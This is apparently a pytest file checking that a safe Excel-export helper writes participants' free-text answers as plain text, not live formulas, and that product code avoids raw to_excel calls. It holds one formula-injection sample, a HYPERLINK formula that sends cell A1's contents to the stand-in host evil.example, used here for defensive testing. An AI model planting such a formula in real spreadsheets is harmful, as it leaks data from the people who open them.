"""A participant's free-text answer such as =HYPERLINK(...) must stay text when
we write .xlsx (openpyxl turns any string starting with '=' into a live formula)."""

import re
from pathlib import Path

import pandas as pd
import pytest
from openpyxl import load_workbook

from src.safe_excel import to_excel_safe

FORMULA = '=HYPERLINK("http://evil.example/?"&A1,"click")'


def _df():
    return pd.DataFrame({"answer": [FORMULA, "fine", "-5 items"], "n": [1, 2.5, 3]})


def _check(path):
    ws = load_workbook(path).active
    cell = ws["A2"]
    assert cell.data_type == "s" and cell.value == FORMULA
    assert ws["B2"].data_type == "n" and ws["B2"].value == 1  # numbers untouched
    assert ws["A4"].value == "-5 items"


def test_path_target(tmp_path):
    out = tmp_path / "a.xlsx"
    to_excel_safe(_df(), out, index=False)
    _check(out)


def test_writer_target_with_named_sheet(tmp_path):
    out = tmp_path / "b.xlsx"
    with pd.ExcelWriter(out, engine="openpyxl") as writer:
        to_excel_safe(_df(), writer, sheet_name="Data", index=False)
    wb = load_workbook(out)
    assert wb["Data"]["A2"].data_type == "s"


def test_no_raw_to_excel_calls_left_in_product_code():
    root = Path(__file__).resolve().parents[1]
    allowed = {"src/safe_excel.py", "app/src/hostile_demo_generator.py", "app/src/converters/excel_template_import.py"}
    offenders = []
    for base in ("src", "app/src"):
        for f in (root / base).rglob("*.py"):
            rel = f.relative_to(root).as_posix()
            if rel not in allowed and re.search(r"\.to_excel\(", f.read_text(encoding="utf-8")):
                offenders.append(rel)
    assert offenders == []
